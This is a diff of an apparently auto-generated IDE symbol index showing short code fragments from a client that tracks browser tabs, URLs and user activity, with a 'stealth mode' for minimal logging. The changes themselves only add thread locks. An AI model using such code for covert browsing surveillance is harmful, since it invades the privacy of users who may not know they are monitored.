@@ -1630,7 +1630,7 @@
         "kind": 6,
         "importPath": "client.src.modules.browser_tracker",
         "description": "client.src.modules.browser_tracker",
-        "peekOfCode": "class BrowserTracker:\n    \"\"\"Enhanced browser tracking with real-time tab and URL monitoring + activity detection\"\"\"\n    def __init__(self, api_client, logger):\n        self.api_client = api_client\n        self.logger = logger\n        self.running = False\n        # Browser sessions tracking\n        self.active_sessions: Dict[str, BrowserSession] = {}\n        self.url_activities: Dict[str, Dict] = {}  # url -> activity data\n        # Activity detector integration",
+        "peekOfCode": "class BrowserTracker:\n    \"\"\"Enhanced browser tracking with real-time tab and URL monitoring + activity detection\"\"\"\n    def __init__(self, api_client, logger):\n        self.api_client = api_client\n        self.logger = logger\n        self.running = False\n        # Thread safety locks\n        self._sessions_lock = threading.Lock()\n        self._activities_lock = threading.Lock()\n        # Browser sessions tracking",
         "detail": "client.src.modules.browser_tracker",
         "documentation": {}
     },
@@ -2332,7 +2332,16 @@
         "kind": 2,
         "importPath": "client.main",
         "description": "client.main",
-        "peekOfCode": "def signal_handler(signum, frame):\n    \"\"\"Handle shutdown signals gracefully\"\"\"\n    global shutdown_flag\n    shutdown_flag = True\ndef setup_stealth_logging():\n    \"\"\"Setup logging for stealth mode - minimal output\"\"\"\n    if Config.STEALTH_MODE:\n        # In stealth mode, log to file only with minimal level\n        log_file = os.path.join(Config.LOG_DIR, 'stealth.log')\n        logging.basicConfig(",
+        "peekOfCode": "def signal_handler(signum, frame):\n    \"\"\"Handle shutdown signals gracefully\"\"\"\n    global shutdown_flag\n    with shutdown_lock:\n        shutdown_flag = True\ndef is_shutdown_requested():\n    \"\"\"Thread-safe check for shutdown flag\"\"\"\n    with shutdown_lock:\n        return shutdown_flag\ndef setup_stealth_logging():",
+        "detail": "client.main",
+        "documentation": {}
+    },
+    {
+        "label": "is_shutdown_requested",
+        "kind": 2,
+        "importPath": "client.main",
+        "description": "client.main",
+        "peekOfCode": "def is_shutdown_requested():\n    \"\"\"Thread-safe check for shutdown flag\"\"\"\n    with shutdown_lock:\n        return shutdown_flag\ndef setup_stealth_logging():\n    \"\"\"Setup logging for stealth mode - minimal output\"\"\"\n    if Config.STEALTH_MODE:\n        # In stealth mode, log to file only with minimal level\n        log_file = os.path.join(Config.LOG_DIR, 'stealth.log')\n        logging.basicConfig(",
         "detail": "client.main",
         "documentation": {}
     },
@@ -2359,7 +2368,16 @@
         "kind": 5,
         "importPath": "client.main",
         "description": "client.main",
-        "peekOfCode": "shutdown_flag = False\ndef signal_handler(signum, frame):\n    \"\"\"Handle shutdown signals gracefully\"\"\"\n    global shutdown_flag\n    shutdown_flag = True\ndef setup_stealth_logging():\n    \"\"\"Setup logging for stealth mode - minimal output\"\"\"\n    if Config.STEALTH_MODE:\n        # In stealth mode, log to file only with minimal level\n        log_file = os.path.join(Config.LOG_DIR, 'stealth.log')",
+        "peekOfCode": "shutdown_flag = False\nshutdown_lock = threading.Lock()\ndef signal_handler(signum, frame):\n    \"\"\"Handle shutdown signals gracefully\"\"\"\n    global shutdown_flag\n    with shutdown_lock:\n        shutdown_flag = True\ndef is_shutdown_requested():\n    \"\"\"Thread-safe check for shutdown flag\"\"\"\n    with shutdown_lock:",
+        "detail": "client.main",
+        "documentation": {}
+    },
+    {
+        "label": "shutdown_lock",
+        "kind": 5,
+        "importPath": "client.main",
+        "description": "client.main",
+        "peekOfCode": "shutdown_lock = threading.Lock()\ndef signal_handler(signum, frame):\n    \"\"\"Handle shutdown signals gracefully\"\"\"\n    global shutdown_flag\n    with shutdown_lock:\n        shutdown_flag = True\ndef is_shutdown_requested():\n    \"\"\"Thread-safe check for shutdown flag\"\"\"\n    with shutdown_lock:\n        return shutdown_flag",
         "detail": "client.main",
         "documentation": {}
     },
